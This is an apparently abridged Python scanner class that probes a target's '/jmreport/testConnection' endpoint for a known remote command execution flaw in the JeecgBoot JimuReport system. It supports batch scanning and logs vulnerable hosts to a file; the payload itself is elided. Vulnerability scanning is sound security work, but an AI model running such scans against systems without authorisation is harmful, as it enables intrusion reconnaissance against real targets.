...
class JeecgBoot_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/jmreport/testConnection'
        header = {
        ...
        try:
            ...
            if "ping" in req.text and "success" in req.text:
                OutPrintInfoSuc("JeecgBoot", f"存在积木报表系统testConnection接口远程命令执行漏洞 {url2}")

                if self.batch:
                    OutPutFile("jeecgboot_rce.txt",f"存在积木报表系统testConnection接口远程命令执行漏洞 {url2}")
        except Exception:
            if not self.batch:
    ...
    def main(self,target):
        ...
        if not self.batch:
            OutPrintInfo("JeecgBoot", "开始检测积木报表系统testConnection接口远程命令执行漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("JeecgBoot", "积木报表系统testConnection接口远程命令执行漏洞检测结束")
